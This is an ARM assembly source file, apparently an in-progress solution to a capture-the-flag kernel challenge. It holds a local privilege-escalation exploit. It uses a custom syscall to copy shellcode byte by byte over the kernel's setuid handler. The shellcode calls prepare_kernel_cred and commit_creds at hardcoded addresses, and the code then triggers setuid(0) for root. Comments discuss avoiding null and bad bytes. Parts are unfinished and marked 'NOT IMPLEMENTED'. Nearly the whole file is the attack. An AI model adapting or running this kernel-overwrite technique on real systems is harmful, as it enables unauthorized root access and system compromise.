@ rm /tmp/pe.s; vi /tmp/pe.s; as /tmp/pe.s -o /tmp/pe.o; ld /tmp/pe.o -o /tmp/pe; /tmp/pe | base64

.text
.global _start

@ _start:
@     mov r0, #1              @ stdout
@     add r1, pc, #16         @ address of the string
@     mov r7, #4              @ syscall for 'write'
@     swi #0                  @ software interrupt

_start:

    @ zero out r0
    mov r0, #0
    
    @ call and print getuid to screen
    bl _getuid
    ldr r9, =_out
    str r0, [r9]

    @ print 4 bytes 
    @ in out
    @ print the uid basically
    ldr r0, =_out
    mov r1, #4
    bl _print

    @ overrite setuid
    bl _overwrite_setuid
    bl _trigger_setuid

    
_exit:
    mov r7, #1              @ syscall for 'exit'
    swi #0                  @ software interrupt

_print: @ print(pointer@r0, length@r1)

    mov r2, r1 @ move length to register
    mov r1, r0 @ move pointer to register
    mov r0, #1
    mov r7, #4
    swi #0

    mov pc, lr @ branch register LR

_try_write_text:
    mov r7, #223
    ldr r0, =_text
    ldr r0, [r0]
    ldr r1, =_out
    swi #0

    mov pc, lr

_read_addr: @ read_setuid(offset@r0)
    mov r1, r0
    mov r7, #223
    ldr r0, =_addr
    ldr r0, [r0]
    add r0, r1
    ldr r1, =_out
    swi #0

    mov pc, lr


_overwrite_setuid: 
    ldr r9, =_shellcode_end @ r9 end of shellcode pointer
    ldr r8, =_shellcode @ r8 shellcode pointer
    ldr r10, =_setuid_addr
    ldr r10, [r10] @ r10 = sys_setuid

    @ loop copies one byte and increases address
    _overwrite_setuid_main_loop:
        @ read byte from shellcode current pointer
        @ aka r8
        mov  r6,  #0
        ldrb r6, [r8]
        @ trigger overwrite
        mov r7, #223
        mov r0, r8
        mov r1, r10
        swi #0

        @ increase setuid shellcode write pointer
        add r10, r10, #1
        @ increase shellcode current read pointer
        add r8, r8, #1
        @ compare if we are at end of shellcode
        cmp r8, r9
        @ jump if we're not in end of shellcode
        bne _overwrite_setuid_main_loop
    mov pc, lr

_trigger_setuid:   @ setuid(0)
                   @ we're going to overwrite kernel implementation
                   @ so we should be good 
    mov r7, #0x17
    mov r0, #0
    swi #0
    mov pc, lr

@ getuid confirmed to be working
_getuid:
    mov r7, #0x18
    swi #0
    mov pc, lr

_read_flag:
@TODO: IMPLEMENT
    mov pc, lr

.data
_in:
    .string "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"          @ our string, NULL terminated

_out:
    .fill 4096, 0

_dump:
    .string "/tmp/dump"

_text:
    .word 0x80008000

_addr:
    .word 0x80196b58

_shellcode:
    @ 8003f44c T prepare_creds
    @ r0 should contain our setuid 0
    @ shouldn't be a problem
    @adr r9, _prepare_kernel_creds
    @ldr r9, [r9]
    @ that's a good replacement
    movw r9, #0xf924
    movt r9, #0x8003
    mov lr, pc
    mov pc, r9

    @ move pointer to creds to r6
    @ we're not messing with r0 so that 
    @ shouldn't be a problem
    @mov r6, r0 
    @ edit creds
    @ NOT IMPLEMENTED

    @ commit  creds
    @ calc commit creds address
    @adr r9, _commit_creds
    @ldr r9, [r9]
    @ replacement for nulls
    movw r9, 0xf560
    movt r9, 0x8003
    @ commit creds address had 0x6c in it
    @ which is a lowercase letter and not good for us
    add r9, r9, #0xc
    @ move the pointer of creds in r6
    @ to r0
    @mov r0, r6
    mov lr, pc
    mov pc, r9

    @ return i guess
    @ would that work?
    mov pc, lr

_prepare_creds:
    .word 0x8003f44c

_prepare_kernel_creds:
    .word 0x8003f924

_commit_creds:
    .word 0x8003f560 @ intentionally cause segfault to see that it works

_AAAA:
    .word 0x41414141


_shellcode_end: @ help calulate what to write
    nop

_setuid_addr:
    .word 0x8002f2f0